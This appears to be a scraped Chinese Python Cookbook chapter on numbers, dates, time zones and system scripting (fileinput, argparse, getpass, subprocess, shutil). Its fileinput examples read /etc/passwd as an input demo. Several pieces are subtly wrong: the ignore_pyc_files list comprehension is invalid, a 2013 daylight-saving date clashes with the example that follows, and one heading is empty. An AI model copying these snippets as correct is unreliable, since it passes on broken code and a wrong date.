数字的格式化输出 将数字格式化后输出，并控制数字的位数、对齐、千位分隔符和其他的细节。 格式化输出单个数字的时候，可以使用内置的 format() 函数: >>> x = 1234.56789\n>>> # Two decimal places of accuracy\n>>> format(x, '0.2f')\n'1234.57'\n>>> # 右对齐10个字符，一位数精度\n>>> format(x, '>10.1f')\n' 1234.6'\n>>> # Left justified\n>>> format(x, '<10.1f')\n'1234.6 '\n>>> # Centered\n>>> format(x, '&#94;10.1f')\n' 1234.6 '\n>>> # Inclusion of thousands separator\n>>> format(x, ',')\n'1,234.56789'\n>>> format(x, '0,.1f')\n'1,234.6'\n>>> 使用指数记法，将 f 改成 e 或者 E(取决于指数输出的大小写形式): >>> format(x, 'e')\n'1.234568e+03'\n>>> format(x, '0.2E')\n'1.23E+03'\n>>> 同时指定宽度和精度的一般形式是 '[<>&#94;]?width[,]?(.digits)?' ，\n其中 width 和 digits 为整数，?代表可选部分。\n同样的格式也被用在字符串的 format() 方法中: >>> 'The value is {:0,.2f}'.format(x)\n'The value is 1,234.57'\n>>> 数字格式化输出通常是比较简单的。上面演示的技术同时适用于浮点数和decimal 模块中的 Decimal 数字对象。 当指定数字的位数后，结果值会根据 round() 函数同样的规则进行四舍五入后返 回: >>> x\n1234.56789\n>>> format(x, '0.1f')\n'1234.6'\n>>> format(-x, '0.1f')\n'-1234.6'\n>>> 包含千位符的格式化跟本地化没有关系。如果你需要根据地区来显示千位符，你 需要自己去调查下 locale 模块中的函数了。\n同样也可以使用字符串的 translate() 方法来交换千位符: >>> swap_separators = { ord('.'):',', ord(','):'.' }\n>>> format(x, ',').translate(swap_separators)\n'1.234,56789'\n>>> 使用 % 来格式化数字也是可行的，不过比更加先进的 format() 要差一点。\n比如，在使 用 % 操作符格式化数字的时候，一些特性 (添加千位符) 并不能被支持: >>> '%0.2f' % x\n'1234.57'\n>>> '%10.1f' % x\n' 1234.6'\n>>> '%-10.1f' % x\n'1234.6 '\n>>> 二/八/十六进制整数 需要转换或者输出使用二进制，八进制或十六进制表示的整数 bin, 十进制整数转二进制: >>> x = 1234\n>>> bin(x)\n'0b10011010010' oct, 十进制整数转八进制: >>> oct(x)\n'0o2322' hex, 十进制整数转十六进制:: >>> hex(x)\n'0x4d2'\n>>> 如果你不想输出 0b , 0o 或者 0x 的前缀的话，可以使用 format() 函数: >>> format(x, 'b')\n'10011010010'\n>>> format(x, 'o')\n'2322'\n>>> format(x, 'x')\n'4d2'\n>>> 如果你想产生一个无符号值，你需要增加一个指示最大位长度的值。比如为了显示 32 位的值: >>> x = -1234\n>>> format(2**32 + x, 'b')\n'11111111111111111111101100101110'\n>>> format(2**32 + x, 'x')\n'fffffb2e'\n>>> 为了以不同的进制转换整数字符串，简单的使用带有进制的 int() 函数: >>> int('4d2', 16)\n1234\n>>> int('10011010010', 2)\n1234\n>>> Python 指定八进制数的语法跟其 他语言稍有不同。比如，如果你像下面这样指定八进制，会出现语法错误: >>> import os\n>>> os.chmod('script.py', 0755)\n    File \"<stdin>\", line 1\n        os.chmod('script.py', 0755)\n                            &#94;\nSyntaxError: invalid token\n>>> 需确保八进制数的前缀是 0o os.chmod('script.py', 0o755) 字节到大整数的打包与解包 有一个字节字符串并想将它解压成一个整数。或者，你需要将一个大整数转换为 一个字节字符串。 将 bytes 解析为整数，使用 int.from_bytes() 方法，并像下面这样指定字节 顺序: # 128 bit , 16 元素\ndata = b'\\x00\\x124V\\x00x\\x90\\xab\\x00\\xcd\\xef\\x01\\x00#\\x004'\n\n>>> len(data)\n16\n>>> int.from_bytes(data, 'little')\n69120565665751139577663547927094891008\n>>> int.from_bytes(data, 'big')\n94522842520747284487117727783387188\n>>> 了将一个大整数转换为一个字节字符串，使用 int.to_bytes() 方法，并像下面 这样指定字节数和字节顺序: >>> x = 94522842520747284487117727783387188\n>>> x.to_bytes(16, 'big')\nb'\\x00\\x124V\\x00x\\x90\\xab\\x00\\xcd\\xef\\x01\\x00#\\x004'\n>>> x.to_bytes(16, 'little')\nb'4\\x00#\\x00\\x01\\xef\\xcd\\x00\\xab\\x90x\\x00V4\\x12\\x00'\n>>> 大整数和字节字符串之间的转换操作并不常见。\n然而，在一些应用领域有时候也会 出现，比如密码学或者网络。\n例如，IPv6 网络地址使用一个 128 位的整数表示。\n如果 你要从一个数据记录中提取这样的值的时候，你就会面对这样的问题。 作为一种替代方案，你可能想使用 struct 模块来解压字节。\n这样也行得通，不过利用 struct 模块来解压对于整数的大小是有限制的。\n因此，你可 能想解压多个字节串并将结果合并为最终的结果: >>> data b'\\x00\\x124V\\x00x\\x90\\xab\\x00\\xcd\\xef\\x01\\x00#\\x004'\n>>> import struct\n>>> hi, lo = struct.unpack('>QQ', data)\n>>> (hi << 64) + lo\n94522842520747284487117727783387188\n>>> 字节顺序规则 (little 或 big) 仅仅指定了构建整数时的字节的低位高位排列方式。 我们从下面精心构造的 16 进制数的表示中可以很容易的看出来: >>> x = 0x01020304\n>>> x.to_bytes(4, 'big')\nb'\\x01\\x02\\x03\\x04'\n>>> x.to_bytes(4, 'little')\nb'\\x04\\x03\\x02\\x01'\n>>> 如果你试着将一个整数打包为字节字符串，那么它就不合适了，你会得到一个错 误。\n如果需要的话，你可以使用 int.bit_length() 方法来决定需要多少字节位来存储 这个值。: >>> x = 523 ** 23\n>>> x\n335381300113661875107536852714019056160355655333978849017944067\n>>> x.to_bytes(16, 'little')\nTraceback (most recent call last):\nFile \"<stdin>\", line 1, in <module>\nOverflowError: int too big to convert\n>>> x.bit_length()\n208\n>>> nbytes, rem = divmod(x.bit_length(), 8)\n>>> if rem:\n... nbytes += 1\n...\n>>>\n>>> x.to_bytes(nbytes, 'little')\nb'\\x03X\\xf1\\x82iT\\x96\\xac\\xc7c\\x16\\xf3\\xb9\\xcf...\\xd0'\n>>> 复数 复数可以用使用函数 complex(real, imag) 或者是带有后缀 j 的浮点数来指定: >>> a = complex(2, 4)\n>>> b = 3 - 5j\n>>> a\n(2+4j)\n>>> b\n(3-5j)\n>>> 对应的实部、虚部和共轭复数可以很容易的获取: >>> a.real\n2.0\n>>> a.imag\n4.0\n>>> a.conjugate()\n(2-4j)\n>>> 所有常见的数学运算: >>> a + b\n(5-1j)\n>>> a * b\n(26+2j)\n>>> a / b\n(-0.4117647058823529+0.6470588235294118j)\n>>> abs(a)\n4.47213595499958\n>>> 如果要执行其他的复数函数比如正弦、余弦或平方根，使用 cmath 模块: >>> import cmath\n>>> cmath.sin(a)\n(24.83130584894638-11.356612711218174j)\n>>> cmath.cos(a)\n(-11.36423470640106-24.814651485634187j)\n>>> cmath.exp(a)\n(-4.829809383269385-5.5920560936409816j)\n>>> Python 中大部分与数学相关的模块都能处理复数。\n比如使用 numpy ，可以 很容易的构造一个复数数组并在这个数组上执行各种操作: >>> import numpy as np\n>>> a = np.array([2+3j, 4+5j, 6-7j, 8+9j])\n>>> a\narray([ 2.+3.j, 4.+5.j, 6.-7.j, 8.+9.j])\n>>> a + 2\narray([ 4.+3.j, 6.+5.j, 8.-7.j, 10.+9.j])\n>>> np.sin(a)\narray([ 9.15449915 -4.16890696j, -56.16227422 -48.50245524j,\n  -153.20827755-526.47684926j, 4008.42651446-589.49948373j])\n>>> Python 的标准数学函数确实情况下并不能产生复数值，因此你的代码中不可能会 出现复数返回值: >>> import math\n>>> math.sqrt(-1)\nTraceback (most recent call last):\nFile \"<stdin>\", line 1, in <module> ValueError: math domain error\n>>> 如果你想生成一个复数返回结果，你必须显示的使用 cmath 模块，或者在某个支 持复数的库中声明复数类型的使用: >>> import cmath\n>>> cmath.sqrt(-1)\n1j\n>>> 无穷大与 NaN 创建或测试正无穷、负无穷或 NaN(非数字) 的浮点数 Python 并没有特殊的语法来表示这些特殊的浮点值，但是可以使用 float() 来创 建它们: >>> a = float('inf')\n>>> b = float('-inf')\n>>> c = float('nan')\n>>> a\ninf\n>>> b\n-inf\n>>> c\nnan\n>>> 为了测试这些值的存在，使用 math.isinf() 和 math.isnan() 函数: >>> math.isinf(a)\nTrue\n>>> math.isnan(c)\nTrue\n>>> 有一些地 方需要你特别注意，特别是跟比较和操作符相关的时候。\n无穷大数在执行数学计算的时候会传播: >>> a = float('inf')\n>>> a + 45\ninf\n>>> a * 10\ninf\n>>> 10 / a\n0.0\n>>> 但是有些操作时未定义的并会返回一个 NaN 结果: >>> a = float('inf')\n>>> a/a\nnan\n>>> b = float('-inf')\n>>> a + b\nnan\n>>> NaN 值会在所有操作中传播，而不会产生异常: >>> c = float('nan')\n>>> c + 23\nnan\n>>> c / 2\nnan\n>>> c * 2\nnan\n>>> math.sqrt(c) nan\n>>> NaN 值的一个特别的地方时它们之间的比较操作总是返回 False: >>> c = float('nan')\n>>> d = float('nan')\n>>> c == d\nFalse\n>>> c is d\nFalse\n>>> 有时候程序员想改变 Python 默认行为，在返回无穷大或 NaN 结果的操作中抛出 异常。\nfpectl 模块可以用来改变这种行为，但是它在标准的 Python 构建中并没有被 启用，它是平台相关的，并且针对的是专家级程序员。 分数运算 fractions 模块可以被用来执行包含分数的数学运算: >>> from fractions import Fraction\n>>> a = Fraction(5, 4)\n>>> b = Fraction(7, 16)\n>>> print(a + b)\n27/16\n>>> print(a * b) 35/64\n>>> # Getting numerator/denominator\n>>> c = a * b\n>>> c.numerator\n35\n>>> c.denominator 64\n>>> # Converting to a float\n>>> float(c)\n0.546875\n>>> # Limiting the denominator of a value\n>>> print(c.limit_denominator(8))\n4/7\n>>> # Converting a float to a fraction >>> x = 3.75\n>>> y = Fraction(*x.as_integer_ratio()) >>> y\nFraction(15, 4)\n>>> 大型数组运算 使用 numpy .: >>> # Python lists\n>>> x = [1, 2, 3, 4]\n>>> y = [5, 6, 7, 8]\n>>> x * 2\n[1, 2, 3, 4, 1, 2, 3, 4]\n>>> x + 10\nTraceback (most recent call last):\nFile \"<stdin>\", line 1, in <module>\nTypeError: can only concatenate list (not \"int\") to list\n>>> x + y\n[1, 2, 3, 4, 5, 6, 7, 8]\n>>> # Numpy arrays\n>>> import numpy as np\n>>> ax = np.array([1, 2, 3, 4])\n>>> ay = np.array([5, 6, 7, 8])\n>>> ax * 2\narray([2, 4, 6, 8])\n>>> ax + 10\narray([11, 12, 13, 14])\n>>> ax + ay\narray([ 6, 8, 10, 12])\n>>> ax * ay\narray([ 5, 12, 21, 32])\n>>> NumPy 中的标 量运算 (比如 ax * 2 或 ax + 10 ) 会作用在每一个元素上.\n另外，当两个操作数都是 数组的时候执行元素对等位置计算，并最终生成一个新的数组. NumPy 还为数组操作提供了大量的通用函数，这些函数可以作为 math 模块中类似 函数的替代: >>> np.sqrt(ax)\narray([ 1. , 1.41421356, 1.73205081, 2. ])\n>>> np.cos(ax)\narray([ 0.54030231, -0.41614684, -0.9899925 , -0.65364362])\n>>> 底层实现中，NumPy 数组使用了 C 或者 Fortran 语言的机制分配内存。也就是说， 它们是一个非常大的连续的并由同类型数据组成的内存区域。\n所以，你可以构造一个比 普通 Python 列表大的多的数组。比如，如果你想构造一个 10,000*10,000 的浮点数二 维网格，很轻松: >>> grid = np.zeros(shape=(10000,10000), dtype=float) 它扩展 Python 列表的索引功能 - 特别 是对于多维数组: >>> a = np.array([[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 12]])\n>>> a\narray([[ 1, 2, 3, 4],\n[ 5, 6, 7, 8],\n[ 9, 10, 11, 12]])\n>>> # Select row 1\n>>> a[1]\narray([5, 6, 7, 8])\n>>> # Select column 1\n>>> a[:,1]\narray([ 2, 6, 10]) 矩阵与线性代数运算 执行矩阵和线性代数运算，比如矩阵乘法、寻找行列式、求解线性方程组等 等 NumPy 库( numpy )有一个矩阵对象可以用来解决这个问题: >>> import numpy as np\n>>> m = np.matrix([[1,-2,3],[0,4,5],[7,8,-9]])\n>>> m\nmatrix([[ 1, -2, 3],\n        [ 0, 4, 5],\n        [ 7, 8, -9]])\n>>> # Return transpose\n>>> m.T\nmatrix([[ 1, 0, 7],\n        [-2, 4, 8],\n        [ 3, 5, -9]])\n\n>>> # Return inverse\n>>> m.I\nmatrix([[ 0.33043478, -0.02608696, 0.09565217],\n        [-0.15217391, 0.13043478, 0.02173913],\n        [ 0.12173913, 0.09565217, -0.0173913 ]])\n>>> # Create a vector and multiply\n>>> v = np.matrix([[2],[3],[4]])\n>>> v\nmatrix([[2],\n[3],\n[4]])\n>>> m * v matrix([[ 8],\n[32],\n[ 2]])\n>>> 可以在 numpy.linalg 子包中找到更多的操作函数: >>> import numpy.linalg\n>>> # Determinant\n>>> numpy.linalg.det(m)\n-229.99999999999983\n>>> # Eigenvalues\n>>> numpy.linalg.eigvals(m)\narray([-13.11474312, 2.75956154, 6.35518158])\n>>> # Solve for x in mx = v\n>>> x = numpy.linalg.solve(m, v)\n>>> x\nmatrix([[ 0.96521739],\n        [ 0.17391304],\n        [ 0.46086957]])\n>>> m * x matrix([[ 2.],\n[ 3.],\n[ 4.]])\n>>> v matrix([[2],\n[3],\n[4]])\n>>> 随机选择 从一个序列中随机抽取若干元素，或者想生成几个随机数 random 模块有大量的函数用来产生随机数和随机选择元素。\n比如，要想从一个序 列中随机的抽取一个元素，可以使用 random.choice: >>> import random\n>>> values = [1, 2, 3, 4, 5, 6]\n>>> random.choice(values)\n2\n>>> random.choice(values)\n3 为了提取出 N 个不同元素的样本用来做进一步的操作，可以使用 random.sample >>> random.sample(values, 2)\n[6, 2]\n>>> random.sample(values, 2)\n[4, 3]\n>>> random.sample(values, 3)\n[4, 3, 1]\n>>> random.sample(values, 3)\n[5, 4, 1]\n>>> 仅仅只是想打乱序列中元素的顺序，可以使用 random.shuffle >>> random.shuffle(values)\n>>> values\n\n[2, 4, 6, 5, 3, 1]\n>>> random.shuffle(values)\n>>> values\n[3, 5, 2, 1, 6, 4]\n>>> 生成随机整数，请使用 random.randint >>> random.randint(0,10)\n2\n>>> random.randint(0,10)\n5\n>>> random.randint(0,10)\n0\n>>> random.randint(0,10)\n7\n>>> random.randint(0,10)\n10\n>>> random.randint(0,10)\n3\n>>> 为了生成 0 到 1 范围内均匀分布的浮点数，使用 random.random >>> random.random()\n0.9406677561675867\n>>> random.random()\n0.133129581343897\n>>> random.random()\n0.4144991136919316\n>>> 获取 N 位随机位 (二进制) 的整数，使用 random.getrandbits >>> random.getrandbits(200)\n335837000776573622800628485064121869519521710558559406913275\n>>> andom 模块使用 Mersenne Twister 算法来计算生成随机数。\n这是一个确定性算 法，但是你可以通过 random.seed() 函数修改初始化种子: random.seed() # Seed based on system time or os.urandom()\nrandom.seed(12345) # Seed based on integer given\nrandom.seed(b'bytedata') # Seed based on byte data random 模块还包含基于均匀分布、高斯分布和其他分布的 随机数生成函数。\n比如，random.uniform() 计算均匀分布随机数，random.gauss() 计算正态分布随机数。\n对于其他的分布情况请参考在线文档。 在 random 模块中的函数不应该用在和密码学相关的程序中。\n如果你确实需要类似 的功能，可以使用 ssl 模块中相应的函数。\n比如，ssl.RAND_bytes() 可以用来生成一 个安全的随机字节序列。 基本的日期与时间转换 执行简单的时间转换，比如天到秒，小时到分钟等的转换 为了执行不同时间单位的转换和计算，请使用 datetime 模块。比如，为了表示一 个时间段，可以创建一个 timedelta 实例: >>> from datetime import timedelta\n>>> a = timedelta(days=2, hours=6)\n>>> b = timedelta(hours=4.5)\n>>> c = a + b\n>>> c.days\n2\n>>> c.seconds 37800\n>>> c.seconds / 3600\n10.5\n>>> c.total_seconds() / 3600\n58.5\n>>> 如果你想表示指定的日期和时间，先创建一个 datetime 实例然后使用标准的数学 运算来操作它们: >>> from datetime import datetime\n>>> a = datetime(2012, 9, 23)\n>>> print(a + timedelta(days=10))\n2012-10-03 00:00:00\n>>>\n>>> b = datetime(2012, 12, 21)\n>>> d = b - a\n>>> d.days\n89\n>>> now = datetime.today()\n>>> print(now)\n2012-12-21 14:54:43.094063\n>>> print(now + timedelta(minutes=10))\n2012-12-21 15:04:43.094063\n>>> 计算的时候，需要注意的是 datetime 会自动处理闰年: >>> a = datetime(2012, 3, 1)\n>>> b = datetime(2012, 2, 28)\n>>> a - b datetime.timedelta(2)\n>>> (a - b).days\n2\n>>> c = datetime(2013, 3, 1)\n>>> d = datetime(2013, 2, 28)\n>>> (c - d).days\n1\n>>> 对大多数基本的日期和时间处理问题，datetime 模块已经足够了。\n如果你需要执 行更加复杂的日期操作，比如处理时区，模糊时间范围，节假日计算等等，可以考虑使 用 dateutil 模块 许多类似的时间计算可以使用 dateutil.relativedelta() 函数代替。\n但是，有一 点需要注意的就是，它会在处理月份 (还有它们的天数差距) 的时候填充间隙\n, 即有些月有30天, 有些有31天: >>> a = datetime(2012, 9, 23)\n>>> a + timedelta(months=1)\nTraceback (most recent call last):\nFile \"<stdin>\", line 1, in <module>\nTypeError: 'months' is an invalid keyword argument for this function\n>>>\n>>> from dateutil.relativedelta import relativedelta\n>>> a + relativedelta(months=+1)\ndatetime.datetime(2012, 10, 23, 0, 0)\n>>> a + relativedelta(months=+4)\ndatetime.datetime(2013, 1, 23, 0, 0)\n>>>\n>>> # Time between two dates\n>>> b = datetime(2012, 12, 21)\n>>> d = b - a\n>>> d\ndatetime.timedelta(89)\n>>> d = relativedelta(b, a)\n>>> d\nrelativedelta(months=+2, days=+28)\n>>> d.months\n2\n>>> d.days\n28\n>>> 计算最后一个周五的日期 需要查找星期中某一天最后出现的日期，比如星期五 计算当前月份的日期范围 在当前月份中循环每一天，想找到一个计算这个日期范围的高效方 法。 在这样的日期上循环并需要事先构造一个包含所有日期的列表。\n你可以先计算出 开始日期和结束日期，然后在你步进的时候使用 datetime.timedelta 对象递增这个日 期变量即可。 下面是一个接受任意 datetime 对象并返回一个由当前月份开始日和下个月开始日 组成的元组对象: from datetime import datetime, date, timedelta\nimport calendar\n\ndef get_month_range(start_date=None):\n  if start_date is None:\n    start_date = date.today().replace(day=1)\n  _, days_in_month = calendar.monthrange(start_date.year, start_date.month)\n  end_date = start_date + timedelta(days=days_in_month)\n  return (start_date, end_date) 字符串转换为日期 应用程序接受字符串格式的输入，但是你想将它们转换为 datetime 对象以便 在上面执行非字符串操作。 使用 Python 的标准模块 datetime 可以很容易的解决这个问题。比如: >>> from datetime import datetime\n>>> text = '2012-09-20'\n>>> y = datetime.strptime(text, '%Y-%m-%d')\n>>> z = datetime.now()\n>>> diff = z - y\n>>> diff\ndatetime.timedelta(3, 77824, 177393)\n>>> datetime.strptime() 方法支持很多的格式化代码，比如 %Y 代表 4 位数年份，%m 代表两位数月份。\n还有一点值得注意的是这些格式化占位符也可以反过来使用，将日期\n输出为指定的格式字符串形式。 strptime() 的性能要比你想象中的差很多，因为它是使 用纯 Python 实现，并且必须处理所有的系统本地设置。\n如果你要在代码中需要解析大 量的日期并且已经知道了日期字符串的确切格式，可以自己实现一套解析方案来获取 更好的性能。\n比如，如果你已经知道所以日期格式是 YYYY-MM-DD ，你可以像下面这样 实现一个解析函数: from datetime import datetime\n\ndef parse_ymd(s):\n  year_s, mon_s, day_s = s.split('-')\n  return datetime(int(year_s), int(mon_s), int(day_s)) 结合时区的日期操作 你有一个安排在 2012 年 12 月 21 日早上 9:30 的电话会议，地点在芝加哥。\n而你 的朋友在印度的班加罗尔，那么他应该在当地时间几点参加这个会议呢? 对几乎所有涉及到时区的问题，你都应该使用 pytz 模块。\n这个包提供了 Olson 时 区数据库，它是时区信息的事实上的标准，在很多语言和操作系统里面都可以找到。 pytz 模块一个主要用途是将 datetime 库创建的简单日期对象本地化。比如，下 面如何表示一个芝加哥时间的示例: >>> from datetime import datetime\n>>> from pytz import timezone\n>>> d = datetime(2012, 12, 21, 9, 30, 0)\n>>> print(d)\n2012-12-21 09:30:00\n>>>\n>>> # Localize the date for Chicago\n\n>>> central = timezone('US/Central')\n>>> loc_d = central.localize(d)\n>>> print(loc_d)\n2012-12-21 09:30:00-06:00\n>>> 如果你打算在本地化日期上执行计算，你需要特别注意夏令时转换和其他细节。\n比 如，在 2013 年，美国标准夏令时时间开始于本地时间 3 月 13 日凌晨 2:00(在那时，时 间向前跳过一小时)。\n如果你正在执行本地计算，你会得到一个错误。比如: >>> d = datetime(2013, 3, 10, 1, 45)\n>>> loc_d = central.localize(d)\n>>> print(loc_d)\n2013-03-10 01:45:00-06:00\n>>> later = loc_d + timedelta(minutes=30)\n>>> print(later)\n2013-03-10 02:15:00-06:00 # WRONG! WRONG!\n>>> 结果错误是因为它并没有考虑在本地时间中有一小时的跳跃。为了修正这个错误， 可以使用时区对象 normalize() 方法。比如: >>> from datetime import timedelta\n>>> later = central.normalize(loc_d + timedelta(minutes=30))\n>>> print(later)\n2013-03-10 03:15:00-05:00\n>>> 为了不让你被这些东东弄的晕头转向，处理本地化日期的通常的策略先将所有日 期转换为 UTC 时间，并用它来执行所有的中间存储和操作: >>> print(loc_d)\n2013-03-10 01:45:00-06:00\n>>> utc_d = loc_d.astimezone(pytz.utc)\n>>> print(utc_d)\n2013-03-10 07:45:00+00:00\n>>> 一旦转换为 UTC，你就不用去担心跟夏令时相关的问题了。\n因此，你可以跟之前 一样放心的执行常见的日期计算。\n当你想将输出变为本地时间的时候，使用合适的时区 去转换下就行了。比如: >>> later_utc = utc_d + timedelta(minutes=30)\n>>> print(later_utc.astimezone(central))\n2013-03-10 03:15:00-05:00\n>>> 得到时区名, 使用 ISO 3166 国家代码作为关键字去查阅字典 pytz.country_timezones: >>> pytz.country_timezones['IN']\n['Asia/Kolkata']\n>>>","tags":"后端; python","url":"/yq-docs-rear-end-python-cookbook-Number,-date,-time.html","loc":"/yq-docs-rear-end-python-cookbook-Number,-date,-time.html"},{"title":"脚本编程与系统管理","text":"许多人使用 Python 作为一个 shell 脚本的替代，用来实现常用系统任务的自动化，\n如文件的操作，系统的配置等。本章的主要目标是描述关于编写脚本时候经常遇到的一\n些功能。例如，解析命令行选项、获取有用的系统配置数据等等。第 5 章也包含了与文\n件和目录相关的一般信息。 通过重定向/管道/文件接受输入 问题 你希望你的脚本接受任何用户认为最简单的输入方式。包括将命令行的输出通过\n管道传递给该脚本、重定向文件到该脚本，或在命令行中传递一个文件名或文件名列表\n给该脚本。 解决方案 Python 内置的 fileinput 模块让这个变得简单。如果你有一个下面这样的脚本: #!/usr/bin/env python3\nimport fileinput\n\nwith fileinput.input() as f_input:\n  for line in f_input:\n    print(line, end='') 作用就是将文件名传递给Python脚本让其输出文件内容 那么你就能以前面提到的所有方式来为此脚本提供输入。假设你将此脚本保存为\nfilein.py 并将其变为可执行文件，那么你可以像下面这样调用它，得到期望的输出: $ ls | ./filein.py # Prints a directory listing to stdout.\n$ ./filein.py /etc/passwd # Reads /etc/passwd to stdout.\n$ ./filein.py < /etc/passwd # Reads /etc/passwd to stdout. 讨论 fileinput.input() 创建并返回一个 FileInput 类的实例。该实例除了拥有一些\n有用的帮助方法外，它还可被当做一个上下文管理器使用。因此，整合起来，如果我们\n要写一个打印多个文件输出的脚本，那么我们需要在输出中包含文件名和行号，如下所\n示: >>> import fileinput\n>>> with fileinput.input('/etc/passwd') as f:\n>>>   for line in f:\n...     print(f.filename(), f.lineno(), line, end='')\n...\n/etc/passwd 1 ##\n/etc/passwd 2 # User Database\n/etc/passwd 3 #\n<other output omitted> 通过将它作为一个上下文管理器使用，可以确保它不再使用时文件能自动关闭，而\n且我们在之后还演示了 FileInput 的一些有用的帮助方法来获取输出中的一些其他信\n息。 终止程序并给出错误信息 问题 你想向标准错误打印一条消息并返回某个非零状态码来终止程序运行 解决方案 你有一个程序像下面这样终止，抛出一个 SystemExit 异常，使用错误消息作为参\n数。例如: raise SystemExit('It failed!') 它会将消息在 sys.stderr 中打印，然后程序以状态码 1 退出。 解析命令行选项 问题 你的程序如何能够解析命令行选项（位于 sys.argv 中） 解决方案 argparse 模块可被用来解析命令行选项: import argparse\n\nparser = argparse.ArgumentParser(description='Search some files')\n\nparser.add_argument(dest='filenames',metavar='filename', nargs='*')\n\nparser.add_argument('-p', '--pat',metavar='pattern', required=True,\n                    dest='patterns', action='append',\n                    help='text pattern to search for') 讨论 argparse 模块是标准库中最大的模块之一，拥有大量的配置选项。 为 了 解 析 命 令 行 选 项， 你 首 先 要 创 建 一 个 ArgumentParser 实 例，并 使 用\nadd_argument() 方法声明你想要支持的选项。在每个 add_argument() 调用中，dest\n参数指定解析结果被指派给属性的名字。metavar 参数被用来生成帮助信息。action\n参数指定跟属性对应的处理逻辑，通常的值为 store , 被用来存储某个值或讲多个参数\n值收集到一个列表中。下面的参数收集所有剩余的命令行参数到一个列表中。在本例中\n它被用来构造一个文件名列表: parser.add_argument(dest='filenames',metavar='filename', nargs='*') 注解 Python3 有一个click模块可以通过装饰器来使用, 更方便. 运行时弹出密码输入提示 问题 你写了个脚本，运行时需要一个密码。此脚本是交互式的，因此不能将密码在脚本\n中硬编码，而是需要弹出一个密码输入提示，让用户自己输入 解决方案 这时候 Python 的 getpass 模块正是你所需要的。你可以让你很轻松的弹出密码\n输入提示，并且不会在用户终端回显密码。下面是具体代码: import getpass\nuser = getpass.getuser()\npasswd = getpass.getpass()\n\nif svc_login(user, passwd): # You must write svc_login()\n  print('Yay!')\nelse:\n  print('Boo!') 在此代码中，svc_login() 是你要实现的处理密码的函数，具体的处理过程你自己\n决定。 讨论 注意在前面代码中 getpass.getuser() 不会弹出用户名的输入提示。它会根据该\n用户的 shell 环境或者会依据本地系统的密码库（支持 pwd 模块的平台）来使用当前用\n户的登录名，\n如果你想显示的弹出用户名输入提示，使用内置的 input 函数: user = input('Enter your username: ') 还有一点很重要，有些系统可能不支持 getpass() 方法隐藏输入密码。这种情况\n下，Python 会提前警告你这些问题（例如它会警告你说密码会以明文形式显示） 获取终端的大小 问题 你需要知道当前终端的大小以便正确的格式化输出。 解决方案 使用 os.get_terminal_size() 函数来做到这一点: >>> import os\n>>> sz = os.get_terminal_size()\n>>> sz\nos.terminal_size(columns=80, lines=24)\n>>> sz.columns\n80\n>>> sz.lines\n24\n>>> 讨论 有太多方式来得知终端大小了，从读取环境变量到执行底层的 ioctl() 函数等等。\n不过，为什么要去研究这些复杂的办法而不是仅仅调用一个简单的函数呢？ 执行外部命令并获取它的输出 问题 你想执行一个外部命令并以 Python 字符串的形式获取执行结果。 解决方案 使用 subprocess.check_output() 函数。例如: import subprocess\nout_bytes = subprocess.check_output(['netstat','-a']) 这段代码执行一个指定的命令并将执行结果以一个字节字符串的形式返回。如果\n你需要文本形式返回，加一个解码步骤即可。例如: out_text = out_bytes.decode('utf-8') 如果被执行的命令以非零码返回，就会抛出异常。下面的例子捕获到错误并获取返\n回码: try:\n  out_bytes = subprocess.check_output(['cmd','arg1','arg2'])\nexcept subprocess.CalledProcessError as e:\n  out_bytes = e.output # Output generated before error\n  code = e.returncode # Return code 默认情况下，check_output() 仅仅返回输入到标准输出的值。如果你需要同时收\n集标准输出和错误输出，使用 stderr 参数: out_bytes = subprocess.check_output(['cmd','arg1','arg2'],\n                                    stderr=subprocess.STDOUT) 如果你需要用一个超时机制来执行命令，使用 timeout 参数: try:\n  out_bytes = subprocess.check_output(['cmd','arg1','arg2'], timeout=5)\nexcept subprocess.TimeoutExpired as e:\n  ... 通常来讲，命令的执行不需要使用到底层 shell 环境（比如 sh、bash）。一个字符串\n列表会被传递给一个低级系统命令，比如 os.execve() 。如果你想让命令被一个 shell\n执行，传递一个字符串参数，并设置参数 shell=True . 有时候你想要 Python 去执行\n一个复杂的 shell 命令的时候这个就很有用了，比如管道流、I/O 重定向和其他特性。\n例如: out_bytes = subprocess.check_output('grep python | wc > out', shell=True) 需要注意的是在 shell 中执行命令会存在一定的安全风险，特别是当参数来自于用\n户输入时。这时候可以使用 shlex.quote() 函数来将参数正确的用双引用引起来。 讨论 使用 check_output() 函数是执行外部命令并获取其返回值的最简单方式。但是，\n如果你需要对子进程做更复杂的交互，比如给它发送输入，你得采用另外一种方法。这\n时候可直接使用 subprocess.Popen 类: import subprocess\n# Some text to send\ntext = b'''\nhello world\nthis is a test\ngoodbye\n'''\n\n# Launch a command with pipes\np = subprocess.Popen(['wc'],\n                    stdout = subprocess.PIPE,\n                    stdin = subprocess.PIPE)\n\n# Send the data and get the output\nstdout, stderr = p.communicate(text)\n# To interpret as text, decode\nout = stdout.decode('utf-8')\nerr = stderr.decode('utf-8') subprocess 模块对于依赖 TTY 的外部命令不合适用。例如，你不能使用它来自\n动化一个用户输入密码的任务（比如一个 ssh 会话）。这时候，你需要使用到第三方模\n块了，比如基于著名的 expect 家族的工具（pexpect 或类似的） 复制或者移动文件和目录 问题 你想要复制或移动文件和目录，但是又不想调用 shell 命令。 解决方案 shutil 模块有很多便捷的函数可以复制文件和目录。使用起来非常简单: import shutil\n\n# Copy src to dst. (cp src dst)\nshutil.copy(src, dst)\n\n# Copy files, but preserve metadata (cp -p src dst)\nshutil.copy2(src, dst)\n\n# Copy directory tree (cp -R src dst)\nshutil.copytree(src, dst)\n\n# Move src to dst (mv src dst)\nshutil.move(src, dst) 这些函数的参数都是字符串形式的文件或目录名。底层语义模拟了类似的 Unix 命\n令，如上面的注释部分。\n默认情况下，对于符号链接而已这些命令处理的是它指向的东西。例如，如果源文\n件是一个符号链接，那么目标文件将会是符号链接指向的文件。如果你只想复制符号链\n接本身，那么需要指定关键字参数 follow_symlinks , 如下：\n如果你想保留被复制目录中的符号链接，像这样做: shutil.copytree(src, dst, symlinks=True) copytree() 可以让你在复制过程中选择性的忽略某些文件或目录。你可以提供一\n个忽略函数，接受一个目录名和文件名列表作为输入，返回一个忽略的名称列表。例如: def ignore_pyc_files(dirname, filenames):\n  return [name in filenames if name.endswith('.pyc')]\n\nshutil.copytree(src, dst, ignore=ignore_pyc_files) 由于忽略某种模式的文件名是很常见的，因此一个便捷的函数 ignore_patterns()\n已经包含在里面了。例如: shutil.copytree(src, dst, ignore=shutil.ignore_patterns('*~', '*.pyc')) 